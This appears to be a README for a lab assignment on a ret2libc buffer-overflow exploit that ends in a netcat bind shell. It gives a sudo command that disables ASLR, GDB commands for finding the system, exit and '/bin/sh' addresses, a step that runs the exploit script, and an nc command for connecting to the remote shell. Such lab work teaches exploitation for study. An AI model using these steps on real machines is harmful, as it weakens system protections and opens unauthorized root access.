Description of Assignment:
 Linux system which use traditional Netcat, the goal is to use the ret2libc exploit to launch a remote shell. The attack consists of overwriting the program's buffer with 13 "A" characters while running the program with root privileges, then overflowing the base pointer with 4 "B" characters. The program is instructed to execute a payload at a specified address by using the system address to override the return address. A netcat command that creates a bind shell on a given port and permits remote system access creates the payload.

Instruction:

Turn ASLR off so address env variable address doesn't change.
    Command: sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
    
Find Address:
	SYSTEM_ADDR: use p system in GDB
	EXIT_ADDR: use p exit in GDB
	BINSH_ADDR: use find &system,+9999999,"/bin/sh" in GDB

Run script:-
    Command: sh run.sh

To connect to the bind shell on the target machine using netcat, run the following command:-
    Command: nc -nv TARGET_IP TARGET_PORT

